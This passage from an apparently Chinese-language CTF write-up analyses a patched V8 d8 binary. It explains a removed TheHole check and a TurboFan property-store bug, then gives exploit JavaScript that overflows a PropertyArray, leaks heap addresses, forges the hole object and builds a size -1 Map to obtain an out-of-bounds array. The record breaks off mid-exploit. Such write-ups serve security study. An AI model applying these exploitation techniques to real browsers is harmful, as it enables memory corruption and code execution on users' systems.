</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//     global_template-&gt;Set(isolate, &#34;quit&#34;, FunctionTemplate::New(isolate, Quit));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   }
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   global_template-&gt;Set(isolate, &#34;testRunner&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                        Shell::CreateTestRunnerTemplate(isolate));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   global_template-&gt;Set(isolate, &#34;Realm&#34;, Shell::CreateRealmTemplate(isolate));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   global_template-&gt;Set(isolate, &#34;performance&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                        Shell::CreatePerformanceTemplate(isolate));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   global_template-&gt;Set(isolate, &#34;Worker&#34;, Shell::CreateWorkerTemplate(isolate));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>
</span></span><span style=display:flex><span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   // Prevent fuzzers from creating side effects.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   if (!i::FLAG_fuzzing) {
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//     global_template-&gt;Set(isolate, &#34;os&#34;, Shell::CreateOSTemplate(isolate));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   }
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   global_template-&gt;Set(isolate, &#34;d8&#34;, Shell::CreateD8Template(isolate));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>
</span></span><span style=display:flex><span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>// #ifdef V8_FUZZILLI
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   global_template-&gt;Set(
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//       String::NewFromUtf8(isolate, &#34;fuzzilli&#34;, NewStringType::kNormal)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//           .ToLocalChecked(),
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//       FunctionTemplate::New(isolate, Fuzzilli), PropertyAttribute::DontEnum);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>// #endif  // V8_FUZZILLI
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>
</span></span><span style=display:flex><span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   if (i::FLAG_expose_async_hooks) {
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//     global_template-&gt;Set(isolate, &#34;async_hooks&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                          Shell::CreateAsyncHookTemplate(isolate));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   }
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>   <span style=color:#007020;font-weight:700>if</span> (options.throw_on_failed_access_check <span style=color:#666>||</span>
</span></span><span style=display:flex><span>       options.noop_on_failed_access_check) {
</span></span></code></pre></div><p>这里开头注释了 <code>CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</code> 这个检查。通过注释可以看到这个网址：<a href=https://crbug.com/1263462>https://crbug.com/1263462</a> ，大概可以知道这个是为了防止一个针对 <code>hole</code> 的利用，这是一个 v8 中的内部对象，用于表示此位置没有元素（<a href=https://stackoverflow.com/questions/61420580/can-anyone-explain-v8-bytecode-ldathehole>stackoverflow</a>）。我们使用这个原语就可以获得一个 <code>size == -1</code> 的 Map</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// ./d8 --allow-natives-syntax ./poc.js
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>let</span> theHole <span style=color:#666>=</span> <span style=color:#666>%</span>TheHole()
</span></span><span style=display:flex><span>m <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> Map();
</span></span><span style=display:flex><span>m.set(<span style=color:#40a070>1</span>, <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>m.set(theHole, <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>m.<span style=color:#007020;font-weight:700>delete</span>(theHole);
</span></span><span style=display:flex><span>m.<span style=color:#007020;font-weight:700>delete</span>(theHole);
</span></span><span style=display:flex><span>m.<span style=color:#007020;font-weight:700>delete</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// %DebugPrint(m);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>print(m.size);
</span></span></code></pre></div><p>虽然从设计上来说，hole 是永远不会泄漏到“用户态”的 js 代码中的，但是许多漏洞都可以最后伪造出 hole 对象来实现稳定的 oob ，所以<a href=https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3%5E%21/#F0>在这个 commit 中</a>，添加了更多校验。让这个利用的 trick 失效了。不过在这道题里面，patch 掉了这个校验，所以大概可以知道预期解就是想办法 leak 出一个 hole 对象，然后实现 oob 。</p><p>然后看下一个 patch</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>2812</span>,<span style=color:#40a070>7</span> <span style=color:#666>+</span><span style=color:#40a070>2811</span>,<span style=color:#40a070>7</span> <span>@@</span> JSNativeContextSpecialization<span style=color:#666>::</span>BuildPropertyStore(
</span></span><span style=display:flex><span>       <span style=color:#60a0b0;font-style:italic>// with this transitioning store.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>       MapRef transition_map_ref <span style=color:#666>=</span> transition_map.value();
</span></span><span style=display:flex><span>       MapRef original_map <span style=color:#666>=</span> transition_map_ref.GetBackPointer().AsMap();
</span></span><span style=display:flex><span><span style=color:#666>-</span>      <span style=color:#007020;font-weight:700>if</span> (original_map.UnusedPropertyFields() <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span><span style=color:#666>+</span>      <span style=color:#007020;font-weight:700>if</span> (original_map.UnusedPropertyFields() <span style=color:#666>==</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> times<span style=color:#666>--==</span><span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>         DCHECK(<span style=color:#666>!</span>field_index.is_inobject());
</span></span></code></pre></div><p>这是在 ReducePropertyAccess 中的，处理属性存储时的一个 case ，当 original_map 的 <code>UnusedPropertyFields() == 0</code> 时，patch 前的正确行为为：更换 Map 的 property 存储对象，这样之后才可以正确地向 property 中添加属性</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (original_map.UnusedPropertyFields() <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>  DCHECK(<span style=color:#666>!</span>field_index.is_inobject());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// Reallocate the properties {storage}.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  storage <span style=color:#666>=</span> effect <span style=color:#666>=</span> BuildExtendPropertiesBackingStore(
</span></span><span style=display:flex><span>                                                       original_map, storage, effect, control);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// Perform the actual store.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  effect <span style=color:#666>=</span> graph()<span style=color:#666>-&gt;</span>NewNode(simplified()<span style=color:#666>-&gt;</span>StoreField(field_access),
</span></span><span style=display:flex><span>                            storage, value, effect, control);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// Atomically switch to the new properties below.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  field_access <span style=color:#666>=</span> AccessBuilder<span style=color:#666>::</span>ForJSObjectPropertiesOrHashKnownPointer();
</span></span><span style=display:flex><span>  value <span style=color:#666>=</span> storage;
</span></span><span style=display:flex><span>  storage <span style=color:#666>=</span> receiver;
</span></span><span style=display:flex><span> }
</span></span></code></pre></div><p>观察 if 中添加的 node ，可以看出确实更换了 storage node 。那么之后添加的节点就可以认为一定可以安全地向 storage node 中写入了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ..
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  value <span style=color:#666>=</span> storage;
</span></span><span style=display:flex><span>  storage <span style=color:#666>=</span> receiver;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>effect <span style=color:#666>=</span> graph()<span style=color:#666>-&gt;</span>NewNode(
</span></span><span style=display:flex><span>                          common()<span style=color:#666>-&gt;</span>BeginRegion(RegionObservability<span style=color:#666>::</span>kObservable), effect);
</span></span><span style=display:flex><span>effect <span style=color:#666>=</span> graph()<span style=color:#666>-&gt;</span>NewNode(
</span></span><span style=display:flex><span>                          simplified()<span style=color:#666>-&gt;</span>StoreField(AccessBuilder<span style=color:#666>::</span>ForMap()), receiver,
</span></span><span style=display:flex><span>                          jsgraph()<span style=color:#666>-&gt;</span>Constant(transition_map_ref), effect, control);
</span></span><span style=display:flex><span>effect <span style=color:#666>=</span> graph()<span style=color:#666>-&gt;</span>NewNode(simplified()<span style=color:#666>-&gt;</span>StoreField(field_access), storage,
</span></span><span style=display:flex><span>                          value, effect, control);
</span></span><span style=display:flex><span>effect <span style=color:#666>=</span> graph()<span style=color:#666>-&gt;</span>NewNode(common()<span style=color:#666>-&gt;</span>FinishRegion(),
</span></span><span style=display:flex><span>                          jsgraph()<span style=color:#666>-&gt;</span>UndefinedConstant(), effect);
</span></span></code></pre></div><p>可以看到，不会有 checkbounds 之类节点的添加，会直接写入值。</p><p>然而在 patch 过后，第一次执行该优化时就会跳过之前替换 storage node 的 nodes 添加。这可以导致 oob ，最后实现任意地址读写（我就是拿这个任意地址读写伪造了一个 hole 对象）。</p><p>我们来观察一下他的效果</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>let</span> m <span style=color:#666>=</span> {a<span style=color:#666>:</span> <span style=color:#40a070>0x100</span>};
</span></span><span style=display:flex><span><span style=color:#666>%</span>DebugPrint(m);
</span></span><span style=display:flex><span>m.b <span style=color:#666>=</span> <span style=color:#40a070>0x200</span>;
</span></span><span style=display:flex><span><span style=color:#666>%</span>DebugPrint(m);
</span></span></code></pre></div><figure><img src=/ox-hugo/property-store-demo-1.png></figure><p>可见一个全新创建的 map ，会把初始化的元素 <code>in-object</code> 储存，其 unused property fields 即为 0 ，其 properties 也执行了一个 <code>FixedArray[0]</code> ，即空数组。</p><p><img src=/ox-hugo/property-store-demo-2.png alt>
然后在给 map 新增一个属性后，原来的 <code>FixedArray[0]</code> 就被替换成了 <code>PropertyArray[3]</code> ，相应的，unused property fields 也变成了 2 （3 - 1）。这是在解释器中的行为，我们可以想象正确的 turbofan 优化后也应该有一样的效果，但是在 patch 后生成的代码将不会替换 properties 指向的目标，在添加属性时，就会直接向 <code>FixedArray[0]</code> 中继续写入了。我们来看下面这个例子</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>function</span> PropertyStore() {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> m <span style=color:#666>=</span> {a<span style=color:#666>:</span> <span style=color:#40a070>0x100</span>};
</span></span><span style=display:flex><span>  <span style=color:#666>%</span>DebugPrint(m);
</span></span><span style=display:flex><span>  m.b <span style=color:#666>=</span> <span style=color:#40a070>0x200</span>;
</span></span><span style=display:flex><span>  <span style=color:#666>%</span>DebugPrint(m);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#666>%</span>PrepareFunctionForOptimization(PropertyStore);
</span></span><span style=display:flex><span>PropertyStore();
</span></span><span style=display:flex><span><span style=color:#666>%</span>OptimizeFunctionOnNextCall(PropertyStore);
</span></span><span style=display:flex><span>PropertyStore();
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>...
</span></span><span style=display:flex><span>Received signal <span style=color:#40a070>11</span> SEGV_ACCERR <span style=color:#bb60d5>368800002258</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#666>====</span> C stack <span style=color:#bb60d5>trace</span> <span style=color:#666>===============================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#666>[</span>0x55bdcee5bc83<span style=color:#666>]</span>
</span></span><span style=display:flex><span> <span style=color:#666>[</span>0x55bdcee5bbd1<span style=color:#666>]</span>
</span></span><span style=display:flex><span> <span style=color:#666>[</span>0x7f7a684d3520<span style=color:#666>]</span>
</span></span><span style=display:flex><span> <span style=color:#666>[</span>0x55bd400040f0<span style=color:#666>]</span>
</span></span><span style=display:flex><span><span style=color:#666>[</span>end of stack trace<span style=color:#666>]</span>
</span></span><span style=display:flex><span>fish: Job 1, <span style=color:#4070a0>&#39;./d8 --allow-natives-syntax ./d&#39;</span> terminated by signal SIGSEGV <span style=color:#666>(</span>Address boundary error<span style=color:#666>)</span>
</span></span></code></pre></div><p>执行后直接发生了 crash ，这是因为在优化后， <code>m.b = 0x200</code> 这个语句会直接向 <code>FixedArray[0]</code> 中写入，但是这个对象是一个特殊对象，专门用于表示空数组，处在只读内存段，写入便会导致段错误。</p><h2 id=漏洞利用><span class=section-num>2</span> 漏洞利用</h2><p>如果想要实现利用，我们要想个办法构造可以写入的 properties 从而实现 oob。从上面的 <code>%DebugPrint</code> 我们可以发现， <code>UnusedPropertyFields() == 0</code> 时， <code>FixedArray[0]</code> 会被替换为 <code>PropertyArray[3]</code> ，可以存储三个属性，并且他是一个动态分配、处于可读写堆端的对象，我们可以先构造一个 properties 为 <code>PropertyArray[3]</code> 的 map ，并且把该数组填满，使 unused property fields 为 0 ，然后触发优化，此时再添加 property ，就可以实现 oob 了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>function</span> TestSetProperty(obj, s) {
</span></span><span style=display:flex><span>  obj.d1 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xDEADBEEF73311337</span>n);
</span></span><span style=display:flex><span>  obj.d2 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0x99996666AAAABBBB</span>n);
</span></span><span style=display:flex><span>  obj.d3 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0x99996666AAAABBBB</span>n);
</span></span><span style=display:flex><span>  <span style=color:#666>%</span>DebugPrint(obj);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> obj;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> oober <span style=color:#666>=</span> {};
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>const</span> N <span style=color:#666>=</span> <span style=color:#40a070>10000</span>;
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> (<span style=color:#007020;font-weight:700>let</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> map <span style=color:#666>=</span> {a1<span style=color:#666>:</span> <span style=color:#40a070>0x100</span>, b<span style=color:#666>:</span> <span style=color:#40a070>0x200</span>};
</span></span><span style=display:flex><span>  map.a2 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xAAAABBBBCCCCDDDD</span>n);
</span></span><span style=display:flex><span>  map.a3 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xEEEEFFFF11112222</span>n);
</span></span><span style=display:flex><span>  map.a4 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0x3333444455556666</span>n);
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// %DebugPrint(map);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  console.log(map.a4);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>==</span> N <span style=color:#666>-</span> <span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>    oober <span style=color:#666>=</span> TestSetProperty(map, i);
</span></span><span style=display:flex><span>  } <span style=color:#007020;font-weight:700>else</span> {
</span></span><span style=display:flex><span>    TestSetProperty(map);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><figure><img src=/ox-hugo/map-oob.png></figure><p><em>这个 poc 可能会 crash ，但是没关系，写 exp 的时候调整一下就不会了。同时还要注意，poc 里面的 <code>console.log(map.a4)</code> 这句话不能删掉，不然就不会发生优化了（至少我调的时候是这样的）</em></p><p>可以看到，map 中的元素的确发出了溢出，并且 corrupt 了 a3 这个属性， <code>%DebugPrint</code> 甚至他解析成了一个 <code>JSObject</code> 。</p><p>那么这里发生了什么呢？其实就是优化之后，直接向 <code>PropertyArray[3]</code> 中越界写入，导致了 oob ，而其中 d2 这个属性复写了 a3 属性的值，所以我们只要读出 a3 就可以实现堆地址的 leak ，而改写 a3 的值，就可以完全控制 d2 指向的目标，然后再读写 d2 的值，就可以实现任意地址读写了。这里具体的调试过程我就不再赘述了（调了一天，眼都花了），总之我们修改一个 map 的属性指向 theHole ，就可以实现 hole 的 leak 了。（看起来 theHole 在固定偏移中，所以我们只要写 <code>0x2451</code> 这样一根压缩指针就可以了）。获得 hole 之后就可以搞出一个 size 为 -1 的 map 了。</p><h2 id=poc><span class=section-num>3</span> poc</h2><p>以下为实现 addressOf 和 fakeObject 原语的 poc</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> buffer <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> ArrayBuffer(<span style=color:#40a070>8</span>);
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> float64_arr <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> Float64Array(buffer);
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> uint64_arr <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> BigUint64Array(buffer);
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> udf_addr <span style=color:#666>=</span> <span style=color:#40a070>0</span>n;
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> i2f <span style=color:#666>=</span> (uint64) =&gt; {
</span></span><span style=display:flex><span>  uint64_arr[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> uint64;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> float64_arr[<span style=color:#40a070>0</span>];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> f2i <span style=color:#666>=</span> (float64) =&gt; {
</span></span><span style=display:flex><span>  float64_arr[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> float64;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> uint64_arr[<span style=color:#40a070>0</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>function</span> TestSetProperty(obj, s) {
</span></span><span style=display:flex><span>  obj.d1 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xDEADBEEF73311337</span>n);
</span></span><span style=display:flex><span>  obj.d2 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0x99996666AAAABBBB</span>n);
</span></span><span style=display:flex><span>  obj.d3 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0x99996666AAAABBBB</span>n);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> obj;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> oober <span style=color:#666>=</span> {};
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>const</span> N <span style=color:#666>=</span> <span style=color:#40a070>10000</span>;
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> (<span style=color:#007020;font-weight:700>let</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> map <span style=color:#666>=</span> {a1<span style=color:#666>:</span> <span style=color:#40a070>0x100</span>, b<span style=color:#666>:</span> <span style=color:#40a070>0x200</span>};
</span></span><span style=display:flex><span>  map.a2 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xAAAABBBBCCCCDDDD</span>n);
</span></span><span style=display:flex><span>  map.a3 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xEEEEFFFF11112222</span>n);
</span></span><span style=display:flex><span>  map.a4 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0x3333444455556666</span>n);
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// %DebugPrint(map);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  console.log(map.a4);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>==</span> N <span style=color:#666>-</span> <span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>    oober <span style=color:#666>=</span> TestSetProperty(map, i);
</span></span><span style=display:flex><span>  } <span style=color:#007020;font-weight:700>else</span> {
</span></span><span style=display:flex><span>    TestSetProperty(map);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// %DebugPrint(oober);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>console.log(f2i(oober.a3).toString(<span style=color:#40a070>16</span>));
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// %SystemBreak();
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>let</span> map <span style=color:#666>=</span> {a1<span style=color:#666>:</span> <span style=color:#40a070>0x100</span>};
</span></span><span style=display:flex><span>map.a2 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xbeefbeefbeefbeef</span>n);
</span></span><span style=display:flex><span>map.a3 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xbeefbeefbeefbeef</span>n);
</span></span><span style=display:flex><span>map.a4 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xbeefbeefbeefbeef</span>n);
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// %DebugPrint(map);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>heap_addr <span style=color:#666>=</span> f2i(oober.a3);
</span></span><span style=display:flex><span>heap_addr <span style=color:#666>=</span> heap_addr <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFF</span>n;
</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;head_addr: 0x&#34;</span> <span style=color:#666>+</span> heap_addr.toString(<span style=color:#40a070>16</span>));
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// let hole_addr = 0x2451n;
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>var</span> holeMap <span style=color:#666>=</span> {a<span style=color:#666>:</span> <span style=color:#40a070>0x100</span>};
</span></span><span style=display:flex><span>holeMap.udf1 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>undefined</span>;
</span></span><span style=display:flex><span>holeMap.udf2 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>undefined</span>;
</span></span><span style=display:flex><span>holeMap.udf3 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>undefined</span>;
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// %DebugPrint(oober);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// udf_addr = head_addr + 0x280n;
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>const</span> offset_to_map <span style=color:#666>=</span> <span style=color:#40a070>0x274</span>n <span style=color:#666>+</span> <span style=color:#40a070>8</span>n
</span></span><span style=display:flex><span>oober.a3 <span style=color:#666>=</span> i2f((heap_addr <span style=color:#666>+</span> offset_to_map) <span style=color:#666>|</span> ((heap_addr <span style=color:#666>+</span> offset_to_map) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>32</span>n));
</span></span><span style=display:flex><span>oober.d2 <span style=color:#666>=</span> i2f(<span style=color:#40a070>0x0000245100002451</span>n);
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// %DebugPrint(holeMap);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>let</span> theHole <span style=color:#666>=</span> holeMap.udf2;
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// %DebugPrint(holeMap);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// %DebugPrint(theHole);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>function</span> FinalExploit(hole) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>function</span> GetOobArr(hole) {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>let</span> m <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> Map();
</span></span><span style=display:flex><span>    m.set(<span style=color:#40a070>1</span>, <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>    m.set(hole, <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>    m.<span style=color:#007020;font-weight:700>delete</span>(hole);
</span></span><span style=display:flex><span>    m.<span style=color:#007020;font-weight:700>delete</span>(hole);
</span></span><span style=display:flex><span>    m.<span style=color:#007020;font-weight:700>delete</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>    console.log(m.size);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>let</span> oob_arr <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> <span style=color:#007020>Array</span>(<span style=color:#40a070>1.1</span>, <span style=color:#40a070>1.1</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    m.set(<span style=color:#40a070>0x10</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>    m.set(oob_arr, <span style=color:#40a070>0xffff</span>);
</span></span><span style=display:flex><span>    console.log(<span style=color:#4070a0>&#34;oob_arr length:&#34;</span>, oob_arr.length);
